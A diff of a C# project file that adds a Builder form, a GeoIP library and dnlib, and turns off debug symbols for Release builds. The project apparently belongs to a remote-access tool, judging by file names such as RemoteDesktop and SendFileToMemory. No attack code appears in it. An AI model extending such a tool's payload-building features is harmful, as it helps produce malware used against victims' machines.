@@ -26,7 +26,7 @@
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
-    <DebugType>pdbonly</DebugType>
+    <DebugType>none</DebugType>
     <Optimize>true</Optimize>
     <OutputPath>bin\Release\</OutputPath>
     <DefineConstants>TRACE</DefineConstants>
@@ -39,6 +39,13 @@
     <ApplicationIcon>async_icon.ico</ApplicationIcon>
   </PropertyGroup>
   <ItemGroup>
+    <Reference Include="cGeoIp, Version=1.0.0.0, Culture=neutral, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>Resources\cGeoIp.dll</HintPath>
+    </Reference>
+    <Reference Include="dnlib, Version=3.2.0.0, Culture=neutral, PublicKeyToken=50e96378b6e77999, processorArchitecture=MSIL">
+      <HintPath>..\packages\dnlib.3.2.0\lib\net45\dnlib.dll</HintPath>
+    </Reference>
     <Reference Include="Microsoft.VisualBasic" />
     <Reference Include="System" />
     <Reference Include="System.Core" />
@@ -53,6 +60,12 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Forms\Builder.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\Builder.Designer.cs">
+      <DependentUpon>Builder.cs</DependentUpon>
+    </Compile>
     <Compile Include="Forms\Form1.cs">
       <SubType>Form</SubType>
     </Compile>
@@ -72,7 +85,7 @@
       <DependentUpon>RemoteDesktop.cs</DependentUpon>
     </Compile>
     <Compile Include="Handle Packet\HandlePacket.cs" />
-    <Compile Include="Helper.cs" />
+    <Compile Include="Helper\Methods.cs" />
     <Compile Include="MessagePack\BytesTools.cs" />
     <Compile Include="MessagePack\MsgPack.cs" />
     <Compile Include="MessagePack\MsgPackType.cs" />
@@ -119,6 +132,9 @@
     <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeOptimizedCodec.cs" />
     <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeQuickStream.cs" />
     <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeStreamCodec.cs" />
+    <EmbeddedResource Include="Forms\Builder.resx">
+      <DependentUpon>Builder.cs</DependentUpon>
+    </EmbeddedResource>
     <EmbeddedResource Include="Forms\Form1.resx">
       <DependentUpon>Form1.cs</DependentUpon>
     </EmbeddedResource>
@@ -141,6 +157,7 @@
     <EmbeddedResource Include="Forms\SendFileToMemory.resx">
       <DependentUpon>SendFileToMemory.cs</DependentUpon>
     </EmbeddedResource>
+    <None Include="packages.config" />
     <None Include="Properties\Settings.settings">
       <Generator>SettingsSingleFileGenerator</Generator>
       <LastGenOutput>Settings.Designer.cs</LastGenOutput>
@@ -159,6 +176,8 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="async_icon.ico" />
+    <None Include="Resources\cGeoIp.dll" />
+    <None Include="bin\Debug\cGeoIp.dll" />
   </ItemGroup>
   <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
